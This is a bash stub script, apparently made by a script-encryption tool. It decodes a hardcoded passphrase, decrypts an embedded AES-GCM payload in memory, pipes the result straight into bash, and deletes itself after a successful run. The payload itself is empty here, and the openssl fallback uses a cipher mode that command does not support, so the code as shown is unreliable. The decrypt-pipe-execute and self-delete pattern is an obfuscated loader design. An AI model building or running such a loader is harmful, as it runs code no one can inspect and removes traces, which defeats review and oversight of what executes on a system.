#!/usr/bin/env bash
set -Eeuo pipefail

# Auto-generated stub â€” removes itself after successful execution.
ENC_SHA='b5ce0a4a71b7f1cd2174b8c60963cf8375b5c82b12a577d202f77f363a1b8167'

# compute sha256 of embedded encrypted raw bytes (embedded literal)
calc_sha() {
  python3 - <<'PY' 2>/dev/null
import base64, hashlib,sys
try:
    raw = base64.b64decode("")
    print(hashlib.sha256(raw).hexdigest())
except Exception:
    sys.exit(2)
PY
}

got_sha="$(calc_sha)" || { echo "Integrity check failed (calc_sha)." >&2; exit 2; }
if [ "$got_sha" != "$ENC_SHA" ]; then
    echo "Integrity check failed (hash mismatch)." >&2
    exit 2
fi

# Decrypt in-memory with python and pipe to bash; capture exit status.
python3 - <<'PY' | bash -s -- "$@"
import base64, hashlib, sys, shutil, subprocess, tempfile, os

enc_b64 = ""
salt_b64 = "3/2EL/ZLc2Fe+Kc7yONz8g=="
pass_b64 = "cUhtc2ZQSkVnbERhYWdhcUxvZEVYN090bWYxMzRxLWk="

try:
    enc_raw = base64.b64decode(enc_b64)
    salt = base64.b64decode(salt_b64)
    passphrase = base64.b64decode(pass_b64).decode('utf-8')
except Exception as e:
    sys.stderr.write("Embedded data decode failed: " + str(e) + "\\n")
    sys.exit(2)

key = hashlib.sha256(passphrase.encode('utf-8') + salt).digest()

# Try PyCryptodome (preferred)
try:
    from Crypto.Cipher import AES
    nonce = enc_raw[:12]
    ct_tag = enc_raw[12:]
    if len(ct_tag) < 16:
        raise ValueError("ciphertext too short")
    ct = ct_tag[:-16]
    tag = ct_tag[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plain = cipher.decrypt_and_verify(ct, tag)
    sys.stdout.buffer.write(plain)
    sys.exit(0)
except Exception:
    # fall through to openssl fallback
    pass

# Fallback: openssl CLI (requires modern openssl)
openssl = shutil.which("openssl")
if not openssl:
    sys.stderr.write("PyCryptodome not available and openssl not found\\n")
    sys.exit(3)

tmp_in = tempfile.NamedTemporaryFile(delete=False)
tmp_out = tempfile.NamedTemporaryFile(delete=False)
try:
    tmp_in.write(enc_raw)
    tmp_in.flush()
    tmp_in.close()

    hexkey = key.hex()
    hexiv = enc_raw[:12].hex()

    # Use dd to skip nonce then pipe into openssl
    dd = subprocess.Popen(["dd", "if="+tmp_in.name, "bs=1", "skip=12"], stdout=subprocess.PIPE)
    openssl_proc = subprocess.Popen([openssl, "enc", "-aes-256-gcm", "-d", "-K", hexkey, "-iv", hexiv, "-out", tmp_out.name], stdin=dd.stdout)
    dd.stdout.close()
    openssl_proc.wait()
    if openssl_proc.returncode != 0:
        raise RuntimeError("openssl decryption failed")

    with open(tmp_out.name, "rb") as f:
        data = f.read()
    sys.stdout.buffer.write(data)
finally:
    try:
        os.unlink(tmp_in.name)
    except Exception:
        pass
    try:
        os.unlink(tmp_out.name)
    except Exception:
        pass

PY

status=$?
# If the decrypted script exited successfully, remove this stub immediately.
if [ "$status" -eq 0 ]; then
    rm -f -- "$0" || true
fi
exit "$status"
